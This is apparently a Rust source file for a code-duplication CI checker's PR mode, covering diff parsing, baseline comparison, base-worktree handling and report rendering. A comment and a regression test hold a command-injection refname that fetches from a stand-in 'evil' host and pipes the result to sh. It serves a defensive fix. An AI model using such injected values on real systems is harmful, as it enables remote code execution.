//! `reprise check --base <git-ref>` (spec §2, §6): PR mode. Parses
//! `git diff -U0` hunk ranges (DECISIONS.md D7a: a unit is touched iff its
//! line span intersects a hunk), scans, then classifies findings against the
//! baseline. A finding fails CI iff its tier is at or above `fail_on` in the
//! §6 confidence order, it involves a touched unit, and it is not baselined —
//! or is baselined but worsened. Baselined groups are STILL tracked for
//! inconsistent updates: accepting a duplicate's existence is not accepting
//! its divergence (spec §6).

use crate::baseline::{Baseline, BaselineEntry, BaselineMember, relative_file};
use crate::config::Config;
use crate::report::{Group, Member, Stats, Tier, UnitSummary};
use anyhow::{Context, bail};
use serde::Serialize;
use std::collections::{HashMap, HashSet};
use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// Divergence increase below this is measurement noise, not drift (D20).
pub const DIVERGENCE_EPS: f64 = 0.01;

// ---------- git diff → touched line ranges (D7a) ----------

#[derive(Debug, Default)]
pub struct DiffMap {
    /// Root-relative file → new-side hunk line ranges (1-based, inclusive).
    hunks: HashMap<String, Vec<(u32, u32)>>,
    /// Files the diff deletes: their baseline members count as touched.
    deleted: HashSet<String>,
}

fn spans_overlap(a: (u32, u32), b: (u32, u32)) -> bool {
    a.0 <= b.1 && b.0 <= a.1
}

impl DiffMap {
    pub fn touches(&self, file: &str, span: (u32, u32)) -> bool {
        self.deleted.contains(file)
            || self
                .hunks
                .get(file)
                .is_some_and(|ranges| ranges.iter().any(|&r| spans_overlap(r, span)))
    }

    pub fn file_touched(&self, file: &str) -> bool {
        self.deleted.contains(file) || self.hunks.contains_key(file)
    }
}

fn git_diff(root: &Path, base: &str) -> anyhow::Result<DiffMap> {
    let probe = Command::new("git")
        .arg("-C")
        .arg(root)
        .args(["rev-parse", "--is-inside-work-tree"])
        .output()
        .context("running git (is it installed?)")?;
    if !probe.status.success() {
        bail!(
            "`reprise check` requires a git repository at {} (git rev-parse failed: {})",
            root.display(),
            String::from_utf8_lossy(&probe.stderr).trim()
        );
    }
    // --relative both restricts the diff to the scan root and emits paths
    // relative to it; -U0 hunks carry exact touched ranges (D7a).
    let out = Command::new("git")
        .arg("-C")
        .arg(root)
        .args([
            "diff",
            "--no-ext-diff",
            "--no-color",
            "--relative",
            "-U0",
            base,
        ])
        .output()
        .context("running git diff")?;
    if !out.status.success() {
        bail!(
            "git diff -U0 {base} failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(parse_diff(&String::from_utf8_lossy(&out.stdout)))
}

/// Parse unified-diff hunk headers. Only `---`/`+++` lines inside a file
/// header block are honored, so content lines can't spoof paths (-U0 emits
/// no context lines, but removed lines still start with `-`).
fn parse_diff(text: &str) -> DiffMap {
    let mut map = DiffMap::default();
    let mut in_header = false;
    let mut old_path: Option<String> = None;
    let mut current: Option<String> = None;
    for line in text.lines() {
        if line.starts_with("diff --git ") {
            in_header = true;
            old_path = None;
            current = None;
            continue;
        }
        if in_header {
            if let Some(rest) = line.strip_prefix("--- ") {
                old_path = rest.strip_prefix("a/").map(str::to_string);
                continue;
            }
            if let Some(rest) = line.strip_prefix("+++ ") {
                if rest == "/dev/null" {
                    if let Some(p) = old_path.take() {
                        map.deleted.insert(p);
                    }
                    current = None;
                } else {
                    current = Some(rest.strip_prefix("b/").unwrap_or(rest).to_string());
                }
                continue;
            }
        }
        if let Some(rest) = line.strip_prefix("@@ ") {
            in_header = false;
            let Some(file) = &current else { continue };
            let Some(plus) = rest.split_whitespace().find(|w| w.starts_with('+')) else {
                continue;
            };
            let nums = &plus[1..];
            let parsed = match nums.split_once(',') {
                Some((s, c)) => s.parse::<u32>().ok().zip(c.parse::<u32>().ok()),
                None => nums.parse::<u32>().ok().map(|s| (s, 1)),
            };
            let Some((start, count)) = parsed else {
                continue;
            };
            let range = if count == 0 {
                // Pure deletion: the removal point sits between new-side
                // lines `start` and `start+1` — both are adjacent to it.
                (start.max(1), start + 1)
            } else {
                (start, start + count - 1)
            };
            map.hunks.entry(file.clone()).or_default().push(range);
        }
    }
    map
}

// ---------- classification ----------

#[derive(Debug, Serialize)]
pub struct CheckFinding {
    /// inconsistent-update | new | worsened | drifting
    pub kind: String,
    /// Fails the CI gate (tier at or above `fail_on`, spec §6 order).
    pub fails: bool,
    pub group: Group,
    /// Members the diff touched (inconsistent-update findings).
    pub touched: Vec<Member>,
    /// Members the diff did NOT touch — "members 2 and 3 were not updated".
    pub untouched: Vec<Member>,
    /// (baseline divergence, current divergence) when drift is measurable.
    pub trend: Option<(f64, f64)>,
}

#[derive(Debug, Serialize)]
pub struct CheckReport {
    pub base: String,
    pub fail_on: String,
    /// Inconsistent-update findings first, then by §6 tier order.
    pub findings: Vec<CheckFinding>,
    pub failing: usize,
    /// Base-state source: "base-scan" (fresh worktree scan of the base ref)
    /// or "base-scan (cached)" (transient .reprise/base-state cache hit).
    /// The persistent baseline is a pinned git ref (D40) — never a file.
    pub base_state: String,
    /// Baseline entries in the gating (`main`) section; 0 = no baseline file.
    pub baseline_total: usize,
    /// Current findings matched to a baseline entry.
    pub baseline_matched: usize,
    /// Matched, unworsened findings exempted by the baseline.
    pub baseline_exempt: usize,
    pub touched_units: usize,
    pub stats: Stats,
}

impl CheckReport {
    pub fn failed(&self) -> bool {
        self.failing > 0
    }
}

fn member_matches(bm: &BaselineMember, file_rel: &str, name: &str, span: (u32, u32)) -> bool {
    file_rel == bm.file
        && ((!name.is_empty() && name != "<anon>" && name == bm.name)
            || spans_overlap(span, bm.line_span))
}

/// Line distance between two spans; 0 when they overlap.
fn span_distance(a: (u32, u32), b: (u32, u32)) -> u32 {
    if spans_overlap(a, b) {
        0
    } else if a.1 < b.0 {
        b.0 - a.1
    } else {
        a.0 - b.1
    }
}

/// Among same-file candidates, pick the one best matching `target`: an
/// overlapping span beats a merely-near one, ties broken by least line distance.
fn best_span_match<'a>(cands: &[&'a UnitSummary], target: (u32, u32)) -> Option<&'a UnitSummary> {
    cands
        .iter()
        .min_by_key(|u| {
            (
                !spans_overlap(u.line_span, target),
                span_distance(u.line_span, target),
            )
        })
        .copied()
}

/// Map a baseline member `bm` onto the current unit list `us` for its file
/// (spec §6.1: line numbers shift, fingerprints are stable). Names are NOT
/// unique — Rust `fn new` across impl blocks, trait `fmt` impls, Go same-named
/// methods on different receivers — so when several units share `bm.name`,
/// disambiguate by span overlap / nearness, and for fingerprint-guarded tiers
/// prefer a same-name candidate whose fingerprint matches the group. A UNIQUE
/// name keeps the historical "name wins" behavior. With no usable/matching
/// name, fall back to the fingerprint-guarded span-overlap map (tacky-muck).
fn select_unit<'a>(
    us: &[&'a UnitSummary],
    bm: &BaselineMember,
    fingerprint: &str,
    fp_guarded: bool,
) -> Option<&'a UnitSummary> {
    if !bm.name.is_empty() && bm.name != "<anon>" {
        let named: Vec<&'a UnitSummary> =
            us.iter().copied().filter(|u| u.name == bm.name).collect();
        match named.as_slice() {
            [] => {}                      // no name match: fall through to span-overlap
            [only] => return Some(*only), // unique name: historical behavior
            many => {
                // Multiple same-named units. For fp-guarded tiers, prefer the
                // fingerprint match(es); then the best span match among the pool.
                let fp_matches: Vec<&'a UnitSummary> = if fp_guarded {
                    many.iter()
                        .copied()
                        .filter(|u| u.fingerprint == fingerprint)
                        .collect()
                } else {
                    Vec::new()
                };
                let pool = if fp_matches.is_empty() {
                    many
                } else {
                    fp_matches.as_slice()
                };
                return best_span_match(pool, bm.line_span);
            }
        }
    }
    us.iter().copied().find(|u| {
        spans_overlap(u.line_span, bm.line_span) && (!fp_guarded || u.fingerprint == fingerprint)
    })
}

/// Temp worktree of the base ref; removed on drop.
struct BaseWorktree {
    repo: PathBuf,
    dir: tempfile::TempDir,
    /// True when populated via the git-archive fallback: nothing to
    /// `git worktree remove` on drop.
    archived: bool,
}

/// Argv (arguments only) for the `git archive | tar -x` base fallback, as two
/// verbatim vectors — NO shell. `base` flows from untrusted input (`--base` or
/// a scanned repo's `[baseline] ref`), and a git refname may legally contain
/// `'"$;|{}`; the old `sh -c` string-interpolated it, so a malicious ref like
/// `x';curl${IFS}evil|sh;'` executed arbitrary commands (cute-coral). Passing
/// every value as its own argv element makes those metacharacters inert.
fn archive_argv(repo: &Path, base: &str, dest: &Path) -> (Vec<OsString>, Vec<OsString>) {
    let git = vec![
        OsString::from("-C"),
        repo.as_os_str().to_os_string(),
        OsString::from("archive"),
        OsString::from(base),
    ];
    let tar = vec![
        OsString::from("-x"),
        OsString::from("-C"),
        dest.as_os_str().to_os_string(),
    ];
    (git, tar)
}

impl BaseWorktree {
    fn add(repo: &Path, base: &str) -> anyhow::Result<BaseWorktree> {
        let dir = tempfile::TempDir::new()?;
        let path = dir.path().join("base");
        let out = Command::new("git")
            .arg("-C")
            .arg(repo)
            .args(["worktree", "add", "--detach", "-q"])
            .arg(&path)
            .arg(base)
            .output()?;
        if out.status.success() {
            return Ok(BaseWorktree {
                repo: repo.to_path_buf(),
                dir,
                archived: false,
            });
        }
        // Fallback (D41): `git worktree add` depends on per-checkout admin
        // state and has failed in the field on multi-worktree clones
        // (".git/index: Not a directory"). `git archive` only reads objects —
        // no worktree machinery at all. Caveat: it honors export-ignore
        // attributes, so an attribute-excluded file would be missing from the
        // base scan; acceptable for a fallback path.
        std::fs::create_dir_all(&path)?;
        let (git_args, tar_args) = archive_argv(repo, base, &path);
        // Spawn `git archive` and pipe its stdout straight into `tar -x`. Every
        // value is a verbatim argv element — no `sh -c`, so refname/path
        // metacharacters (`'"$;|{}`) can't be interpreted (cute-coral).
        let mut git = Command::new("git")
            .args(&git_args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context("spawning git archive for the base fallback")?;
        let git_stdout = git.stdout.take().expect("git stdout was piped");
        // tar reads git's stdout to EOF; git exits (closing stdout) on error, so
        // there is no pipe deadlock and git's tiny stderr is drained after.
        let tar = Command::new("tar")
            .args(&tar_args)
            .stdin(Stdio::from(git_stdout))
            .output()
            .context("spawning tar for the base fallback")?;
        let git = git
            .wait_with_output()
            .context("waiting on git archive for the base fallback")?;
        anyhow::ensure!(
            git.status.success() && tar.status.success(),
            "git worktree add for base `{base}` failed ({}) and the git-archive \
             fallback also failed (git: {}; tar: {})",
            String::from_utf8_lossy(&out.stderr).trim(),
            String::from_utf8_lossy(&git.stderr).trim(),
            String::from_utf8_lossy(&tar.stderr).trim(),
        );
        Ok(BaseWorktree {
            repo: repo.to_path_buf(),
            dir,
            archived: true,
        })
    }
    fn path(&self) -> PathBuf {
        self.dir.path().join("base")
    }
}

impl Drop for BaseWorktree {
    fn drop(&mut self) {
        if self.archived {
            return; // TempDir cleanup suffices
        }
        let _ = Command::new("git")
            .arg("-C")
            .arg(&self.repo)
            .args(["worktree", "remove", "--force"])
            .arg(self.path())
            .output();
    }
}

/// Version legs that MUST bust the base-state snapshot when they move — the
/// exact set the per-file cache key folds in (`src/cache.rs`). The per-file
/// cache invalidates on a grammar / extraction / IR-scheme / tool-version bump,
/// but the base-state snapshot is loaded via `Baseline::load`, which validates
/// ONLY `fingerprint_scheme`. So without these legs a bump serves a STALE
/// snapshot whose fingerprints mismatch every current group → `baseline_matched`
/// drops to 0 → every touched duplicate falsely reports `new` and CI fails
/// (bold-yelp; spec §12: stale fingerprints must never feed baseline/drift
/// comparisons). Held as a struct so the keying is unit-testable.
#[derive(Clone)]
struct VersionLegs<'a> {
    extraction: u32,
    fingerprint_scheme: u32,
    pkg_version: &'a str,
    grammars: &'a [&'a str],
    ir_scheme: u32,
}

impl VersionLegs<'static> {
    /// The legs this binary was built with — REUSING the same constants the
    /// per-file cache keys on, never hardcoded (they move independently).
    fn current() -> Self {
        VersionLegs {
            extraction: crate::cache::EXTRACTION_VERSION,
            fingerprint_scheme: crate::fingerprint::FINGERPRINT_SCHEME,
            pkg_version: env!("CARGO_PKG_VERSION"),
            grammars: crate::cache::GRAMMAR_VERSIONS,
            ir_scheme: crate::ir::kind::SCHEME_VERSION,
        }
    }
}

/// Base-state snapshot cache signature: the config Debug plus every version leg
/// the per-file cache folds in (bold-yelp). A bump to any leg changes the key,
/// so `check` rescans the base ref instead of serving a stale snapshot.
fn base_state_cfg_sig(cfg: &Config, legs: &VersionLegs) -> u64 {
    let mut buf = Vec::new();
    buf.extend_from_slice(format!("{cfg:?}").as_bytes());
    buf.push(0);
    buf.extend_from_slice(&legs.extraction.to_le_bytes());
    buf.extend_from_slice(&legs.fingerprint_scheme.to_le_bytes());
    buf.extend_from_slice(legs.pkg_version.as_bytes());
    buf.push(0);
    for v in legs.grammars {
        buf.extend_from_slice(v.as_bytes());
        buf.push(0);
    }
    buf.extend_from_slice(&legs.ir_scheme.to_le_bytes());
    xxhash_rust::xxh3::xxh3_64(&buf)
}

/// Base state for the comparison (spec §6 semantics, two sources):
/// - a baseline FILE (optional curation layer: fixed "since acceptance"
///   reference; the file itself is a derived artifact and defaults to living
///   transiently under .reprise/) — used when present;
/// - otherwise TWO-SCAN: scan the base ref in a temp worktree and synthesize
///   the same entry set. Cached transiently under .reprise/base-state/ keyed
///   by resolved base SHA + config, so repeat checks skip the base scan.
fn base_state(root: &Path, cfg: &Config, base: &str) -> anyhow::Result<(Baseline, String)> {
    let sha_out = Command::new("git")
        .arg("-C")
        .arg(root)
        .args(["rev-parse", "--verify"])
        .arg(format!("{base}^{{commit}}"))
        .output()?;
    anyhow::ensure!(
        sha_out.status.success(),
        "cannot resolve base `{base}`: {}",
        String::from_utf8_lossy(&sha_out.stderr)
    );
    let sha = String::from_utf8_lossy(&sha_out.stdout).trim().to_string();
    let cfg_sig = base_state_cfg_sig(cfg, &VersionLegs::current());
    let cache_path = root
        .join(".reprise")
        .join("base-state")
        .join(format!("{sha}-{cfg_sig:016x}.json"));
    if cfg.cache.enabled
        && let Ok(b) = Baseline::load(&cache_path)
    {
        return Ok((b, "base-scan (cached)".to_string()));
    }
    let wt = BaseWorktree::add(root, base)?;
    let mut base_cfg = cfg.clone();
    base_cfg.cache.shared_root = Some(root.to_path_buf());
    let base_report = crate::scan(&wt.path(), &base_cfg)?;
    let b = crate::baseline::create(&base_report, &wt.path());
    if cfg.cache.enabled {
        let _ = std::fs::create_dir_all(cache_path.parent().unwrap());
        let _ = b.save(&cache_path);
    }
    Ok((b, "base-scan".to_string()))
}

pub fn run(
    root: &Path,
    cfg: &Config,
    base: &str,
    fail_on_override: Option<&str>,
) -> anyhow::Result<CheckReport> {
    let diff = git_diff(root, base)?;
    let fail_on = fail_on_override.unwrap_or(&cfg.report.fail_on).to_string();
    let threshold = Tier::parse_fail_on(&fail_on)?;
    let (baseline, base_state) = base_state(root, cfg, base)?;
    let baseline = Some(baseline);
    let report = crate::scan(root, cfg)?;

    let rel = |p: &Path| relative_file(p, root);
    let fails = |tier: Tier| -> bool {
        matches!((tier.fail_rank(), threshold), (Some(r), Some(t)) if r <= t)
    };
    // Findings and members render root-relative: check output is for review.
    let rel_member = |m: &Member| -> Member {
        let mut m = m.clone();
        m.file = PathBuf::from(rel(&m.file));
        m
    };
    let rel_group = |g: &Group| -> Group {
        let mut g = g.clone();
        for m in &mut g.members {
            *m = rel_member(m);
        }
        g
    };

    // Current plain units by relative file, for baseline-member mapping
    // (spec §6.1 tolerance: line numbers shift; fingerprints are stable).
    let mut units_by_file: HashMap<String, Vec<&UnitSummary>> = HashMap::new();
    for u in &report.unit_index {
        units_by_file.entry(rel(&u.file)).or_default().push(u);
    }
    let touched_units = report
        .unit_index
        .iter()
        .filter(|u| diff.touches(&rel(&u.file), u.line_span))
        .count();

    let empty = Vec::new();
    let entries: &Vec<BaselineEntry> = baseline.as_ref().map(|b| &b.findings).unwrap_or(&empty);
    let main_entries: Vec<&BaselineEntry> =
        entries.iter().filter(|e| e.section == "main").collect();
    let mut by_fp: HashMap<&str, Vec<&BaselineEntry>> = HashMap::new();
    for e in &main_entries {
        by_fp.entry(e.fingerprint.as_str()).or_default().push(e);
    }
    let current_by_fp: HashMap<&str, &Group> = report
        .groups
        .iter()
        .map(|g| (g.fingerprint.as_str(), g))
        .collect();

    let mut findings: Vec<CheckFinding> = Vec::new();
    // Baseline groups whose drift an inconsistent-update finding already
    // reports; the per-group pass must not double-report them.
    let mut drift_reported: HashSet<&str> = HashSet::new();

    // ---- inconsistent-update: from BASELINE state (spec §6), so a group
    // whose members drifted apart beyond max_divergence still fires ----
    if cfg.baseline.track_drift {
        // Drift tracking is for COPIES that must be co-updated: unit-granularity
        // tiers only. Region entries are shared idiom runs inside otherwise-
        // different functions — mapping their members at unit granularity made
        // every edit anywhere in a large function "touch" every region it
        // contains (8 false IU failures on our own CI, D39). Regions are
        // tracked only via span-precise touch below; internal-repeat (single
        // member) never qualifies.
        let iu_tracked = |e: &BaselineEntry| {
            matches!(
                e.tier.as_str(),
                "exact-normalized" | "near-normalized" | "inline-assisted"
            ) || e.tier == "exact-region"
        };
        for e in main_entries
            .iter()
            .filter(|e| e.members.len() >= 2 && iu_tracked(e))
        {
            let region = e.tier == "exact-region";
            // Span-overlap alone cannot tell "the same duplicate moved or was
            // renamed" from "this member was deleted and an unrelated function
            // shifted into its old line range" — the latter mis-maps the
            // deleted member onto that function, scores it untouched, and fires
            // a false inconsistent-update when a group is fully consolidated
            // (the ideal dedup). For the exact tiers every member carries the
            // group fingerprint, so require a fingerprint match to accept a
            // span-overlap map; a genuinely deleted member then matches neither
            // name nor fingerprint, stays unmapped, and routes to the
            // "unmapped ⇒ a file edit is a touch" branch below. Fuzzy tiers
            // (near/inline) do not share an exact fingerprint, so they keep the
            // loose span-overlap.
            let fp_guarded = region || e.tier == "exact-normalized";
            let mut touched: Vec<Member> = Vec::new();
            let mut untouched: Vec<Member> = Vec::new();
            let mut touched_accepts = true;
            for bm in &e.members {
                // Map the snapshot onto the current tree: same file, then name —
                // but names aren't unique, so same-named candidates are
                // disambiguated by span/fingerprint; span-overlap is the
                // fallback (select_unit; tacky-muck).
                let unit = units_by_file
                    .get(&bm.file)
                    .and_then(|us| select_unit(us, bm, &e.fingerprint, fp_guarded));
                let (is_touched, line_span) = if region {
                    // Regions: span-precise — the diff must intersect the run
                    // itself, not merely the enclosing unit (D39).
                    (diff.touches(&bm.file, bm.line_span), bm.line_span)
                } else {
                    match unit {
                        Some(u) => (diff.touches(&bm.file, u.line_span), u.line_span),
                        // Unmapped member: touched iff its file was (deleted or
                        // rewritten past recognition — both are edits).
                        None => (diff.file_touched(&bm.file), bm.line_span),
                    }
                };
                let member = Member {
                    file: PathBuf::from(&bm.file),
                    lang: String::new(),
                    name: bm.name.clone(),
                    line_span,
                    parse_degraded: false,
                };
                if is_touched {
                    touched_accepts &= unit.is_some_and(|u| u.accept_drift);
                    touched.push(member);
                } else {
                    untouched.push(member);
                }
            }
            if touched.is_empty() || untouched.is_empty() {
                continue; // all-or-nothing updates are consistent
            }
            let cur = current_by_fp.get(e.fingerprint.as_str());
            let trend = cur
                .map(|g| (e.divergence, g.divergence))
                .filter(|(b, c)| (c - b).abs() > DIVERGENCE_EPS);
            drift_reported.insert(e.fingerprint.as_str());
            let mut members = touched.clone();
            members.extend(untouched.iter().cloned());
            findings.push(CheckFinding {
                kind: "inconsistent-update".into(),
                // Unit-copy drift is the Juergens fault mechanism and gates
                // hard; shared-run (region) drift is real information but a
                // legitimate one-sided change has no acceptance path in
                // artifact-free mode, so it reports without failing (D39).
                // `reprise:accept-drift` on every touched member is the
                // reviewed, source-located acceptance record (D41).
                fails: fails(Tier::InconsistentUpdate) && !region && !touched_accepts,
                group: Group {
                    id: String::new(),
                    tier: Tier::InconsistentUpdate,
                    fingerprint: e.fingerprint.clone(),
                    token_count: cur.map(|g| g.token_count).unwrap_or(0),
                    value: cur.map(|g| g.value).unwrap_or(0.0),
                    note: None,
                    divergence: cur.map(|g| g.divergence).unwrap_or(e.divergence),
                    template: cur.and_then(|g| g.template.clone()),
                    inline_chain: None,
                    members,
                },
                touched,
                untouched,
                trend,
            });
        }
    }

    // ---- current findings vs baseline: new / worsened / drifting ----
    let mut baseline_matched = 0usize;
    let mut baseline_exempt = 0usize;
    for g in &report.groups {
        // Micro-regions stay in `scan` output (ranked low, counted honestly)
        // but are noise at commit time — a 4-line idiom shared with an
        // unrelated function isn't review-worthy. Substantial regions only
        // (user feedback; same floor as the scan summary split, D36/D37).
        if g.tier == Tier::ExactRegion && g.token_count < cfg.report.micro_region_tokens {
            continue;
        }
        let touched: Vec<Member> = g
            .members
            .iter()
            .filter(|m| diff.touches(&rel(&m.file), m.line_span))
            .map(&rel_member)
            .collect();
        // Baseline identity: fingerprint key + at least one member overlap
        // (guards against key collisions between disjoint groups).
        let entry = by_fp.get(g.fingerprint.as_str()).and_then(|es| {
            es.iter()
                .find(|e| {
                    e.members.iter().any(|bm| {
                        g.members
                            .iter()
                            .any(|m| member_matches(bm, &rel(&m.file), &m.name, m.line_span))
                    })
                })
                .copied()
        });
        let Some(e) = entry else {
            if !touched.is_empty() {
                findings.push(CheckFinding {
                    kind: "new".into(),
                    fails: fails(g.tier),
                    group: rel_group(g),
                    touched,
                    untouched: Vec::new(),
                    trend: None,
                });
            }
            continue;
        };
        baseline_matched += 1;
        let member_added = g.members.iter().any(|m| {
            !e.members
                .iter()
                .any(|bm| member_matches(bm, &rel(&m.file), &m.name, m.line_span))
        });
        let drifted = g.divergence > e.divergence + DIVERGENCE_EPS;
        let trend = drifted.then_some((e.divergence, g.divergence));
        if touched.is_empty() {
            // Untouched findings never fail (§6); still flag measurable drift.
            baseline_exempt += 1;
            if drifted
                && cfg.baseline.track_drift
                && !drift_reported.contains(g.fingerprint.as_str())
            {
                findings.push(CheckFinding {
                    kind: "drifting".into(),
                    fails: false,
                    group: rel_group(g),
                    touched: Vec::new(),
                    untouched: Vec::new(),
                    trend,
                });
            }
            continue;
        }
        if member_added || drifted {
            if drift_reported.contains(g.fingerprint.as_str()) && !member_added {
                continue; // the inconsistent-update finding carries this drift
            }
            findings.push(CheckFinding {
                kind: "worsened".into(),
                fails: fails(g.tier),
                group: rel_group(g),
                touched,
                untouched: Vec::new(),
                trend,
            });
        } else {
            baseline_exempt += 1;
        }
    }

    // Lead with inconsistent-update, then §6 tier order, then value.
    findings.sort_by(|a, b| {
        let key = |f: &CheckFinding| {
            (
                f.group.tier.fail_rank().unwrap_or(u32::MAX),
                std::cmp::Reverse((f.group.value * 1000.0) as u64),
                f.group.fingerprint.clone(),
            )
        };
        key(a).cmp(&key(b))
    });
    let failing = findings.iter().filter(|f| f.fails).count();

    Ok(CheckReport {
        base: base.to_string(),
        fail_on,
        findings,
        failing,
        base_state: base_state.clone(),
        baseline_total: main_entries.len(),
        baseline_matched,
        baseline_exempt,
        touched_units,
        stats: report.stats,
    })
}

// ---------- terminal rendering (spec §6: lead with inconsistent-update,
// baseline counts in the header) ----------

impl CheckReport {
    pub fn render_terminal(&self, verbose: bool) -> String {
        let s = &self.stats;
        let mut out = format!(
            "reprise check vs {}: {} touched units of {} indexed; base state: {} findings \
             ({} matched, {} exempt); {} suppressed; cache [{} hits, {} misses]; {}ms\n",
            self.base,
            self.touched_units,
            s.units_indexed,
            self.baseline_total,
            self.baseline_matched,
            self.baseline_exempt,
            s.suppressed_units,
            s.cache_hits,
            s.cache_misses,
            s.duration_ms,
        );
        if self.findings.is_empty() {
            out.push_str(&format!(
                "\nclean: no reportable findings (fail_on {})\n",
                self.fail_on
            ));
            return out;
        }
        for (i, f) in self.findings.iter().enumerate() {
            let gate = if f.fails { "FAIL" } else { "info" };
            out.push_str(&format!(
                "\n#{} [{}] {} · {}",
                i + 1,
                f.group.tier,
                gate,
                f.kind,
            ));
            if f.group.divergence > 0.0 {
                out.push_str(&format!(
                    " · similarity {:.0}%",
                    (1.0 - f.group.divergence) * 100.0
                ));
            }
            out.push('\n');
            if f.kind == "inconsistent-update" {
                out.push_str(&format!(
                    "    this change touches {} of {} members of a duplicate group; \
                     {} member(s) were NOT updated:\n",
                    f.touched.len(),
                    f.group.members.len(),
                    f.untouched.len(),
                ));
                for m in &f.touched {
                    out.push_str(&format!("    touched:   {}\n", member_line(m)));
                    if verbose {
                        crate::report::render_member_source_block(&mut out, m);
                    }
                }
                for m in &f.untouched {
                    out.push_str(&format!("    UNTOUCHED: {}\n", member_line(m)));
                    if verbose {
                        crate::report::render_member_source_block(&mut out, m);
                    }
                }
            } else {
                for m in &f.group.members {
                    out.push_str(&format!("    {}\n", member_line(m)));
                    if verbose {
                        crate::report::render_member_source_block(&mut out, m);
                    }
                }
            }
            if let Some((was, now)) = f.trend {
                out.push_str(&format!(
                    "    drifting: divergence {:.3} at baseline → {:.3} now\n",
                    was, now
                ));
            }
            if let Some(template) = &f.group.template {
                crate::report::render_template_block(&mut out, template, 8);
            }
        }
        if self.failing > 0 {
            out.push_str(&format!(
                "\nFAIL: {} finding(s) at or above fail_on {}\n",
                self.failing, self.fail_on
            ));
        } else {
            out.push_str(&format!(
                "\nclean: {} informational finding(s), none at or above fail_on {}\n",
                self.findings.len(),
                self.fail_on
            ));
        }
        out
    }
}

fn member_line(m: &Member) -> String {
    format!(
        "{}:{}-{}  {}",
        m.file.display(),
        m.line_span.0,
        m.line_span.1,
        m.name
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_hunk_ranges_and_deletions() {
        let diff = "\
diff --git a/src/a.rs b/src/a.rs
index 111..222 100644
--- a/src/a.rs
+++ b/src/a.rs
@@ -10,2 +12,3 @@ fn ctx()
+x
+y
+z
@@ -30 +40,0 @@ fn ctx()
-gone
diff --git a/src/dead.rs b/src/dead.rs
deleted file mode 100644
--- a/src/dead.rs
+++ /dev/null
@@ -1,5 +0,0 @@
-a
";
        let map = parse_diff(diff);
        assert!(map.touches("src/a.rs", (12, 12)));
        assert!(map.touches("src/a.rs", (1, 12)));
        assert!(map.touches("src/a.rs", (14, 20)));
        assert!(!map.touches("src/a.rs", (15, 20)));
        // Pure deletion at new-line 40: adjacency touches 40-41.
        assert!(map.touches("src/a.rs", (41, 45)));
        assert!(!map.touches("src/a.rs", (42, 45)));
        assert!(map.touches("src/dead.rs", (3, 7)));
        assert!(!map.file_touched("src/other.rs"));
    }

    // ---- cute-coral: git-archive fallback argv is shell-free ----

    #[test]
    fn archive_argv_passes_values_verbatim_no_shell() {
        // A malicious `[baseline] ref` can pin a refname with shell metacharacters;
        // the old `sh -c` executed them. Each value must be one verbatim argv
        // element, and no element may be a shell string joining the pieces.
        let repo = Path::new("/repos/it's mine");
        let base = "x';curl${IFS}evil|sh;'";
        let dest = Path::new("/tmp/base dir");
        let (git, tar) = archive_argv(repo, base, dest);
        assert_eq!(
            git,
            vec![
                OsString::from("-C"),
                OsString::from("/repos/it's mine"),
                OsString::from("archive"),
                OsString::from("x';curl${IFS}evil|sh;'"),
            ]
        );
        assert_eq!(
            tar,
            vec![
                OsString::from("-x"),
                OsString::from("-C"),
                OsString::from("/tmp/base dir"),
            ]
        );
        // The `|` inside `base` is carried verbatim as ONE element (that is the
        // fix — inert, not a shell pipe). What must NOT exist is an element that
        // shell-joins git into tar, i.e. the old `| tar` interpolation.
        assert!(
            !git.iter()
                .chain(tar.iter())
                .any(|a| a.to_string_lossy().contains("| tar"))
        );
        // And git's argv never references tar: the two commands are separate.
        assert!(!git.iter().any(|a| a.to_string_lossy().contains("tar")));
    }

    // ---- bold-yelp: base-state key folds the version legs ----

    #[test]
    fn base_state_key_folds_every_version_leg() {
        let cfg = Config::default();
        let base = VersionLegs::current();
        let sig = base_state_cfg_sig(&cfg, &base);

        const OTHER_GRAMMARS: &[&str] = &["tree-sitter/9.9.9-test"];
        let mut ext = base.clone();
        ext.extraction = base.extraction.wrapping_add(1);
        let mut fp = base.clone();
        fp.fingerprint_scheme = base.fingerprint_scheme.wrapping_add(1);
        let mut pkg = base.clone();
        pkg.pkg_version = "0.0.0-test";
        let mut gram = base.clone();
        gram.grammars = OTHER_GRAMMARS;
        let mut ir = base.clone();
        ir.ir_scheme = base.ir_scheme.wrapping_add(1);

        // Every leg the per-file cache keys on must also move the base-state key,
        // or a grammar/extraction/scheme/tool bump serves a stale snapshot.
        for (leg, v) in [
            ("extraction", &ext),
            ("fingerprint_scheme", &fp),
            ("pkg_version", &pkg),
            ("grammars", &gram),
            ("ir_scheme", &ir),
        ] {
            assert_ne!(
                sig,
                base_state_cfg_sig(&cfg, v),
                "version leg `{leg}` is not folded into the base-state cache key"
            );
        }
        // Same legs ⇒ same key: a genuinely-warm snapshot still hits.
        assert_eq!(sig, base_state_cfg_sig(&cfg, &VersionLegs::current()));
    }

    // ---- tacky-muck: same-named units mapped by span/fingerprint ----

    fn unit(name: &str, span: (u32, u32), fp: &str) -> UnitSummary {
        UnitSummary {
            file: PathBuf::from("src/a.rs"),
            name: name.to_string(),
            line_span: span,
            fingerprint: fp.to_string(),
            accept_drift: false,
        }
    }

    fn bmember(name: &str, span: (u32, u32)) -> BaselineMember {
        BaselineMember {
            file: "src/a.rs".into(),
            name: name.into(),
            line_span: span,
        }
    }

    #[test]
    fn select_unit_disambiguates_same_named_by_span() {
        // Two `fn new` in one file (distinct impl blocks): the OLD name-only map
        // took the first, mis-scoring drift onto the wrong span.
        let u_lo = unit("new", (10, 20), "aaa");
        let u_hi = unit("new", (100, 110), "bbb");
        let us = vec![&u_lo, &u_hi];
        // Baseline member sits at the high span → must pick the high unit.
        let bm = bmember("new", (101, 109));
        assert_eq!(
            select_unit(&us, &bm, "zzz", false).unwrap().line_span,
            (100, 110)
        );
        // ...and the low span picks the low unit.
        let bm2 = bmember("new", (11, 19));
        assert_eq!(
            select_unit(&us, &bm2, "zzz", false).unwrap().line_span,
            (10, 20)
        );
    }

    #[test]
    fn select_unit_prefers_fingerprint_among_same_name_when_guarded() {
        // fp-guarded tier: among same-named units the fingerprint match wins even
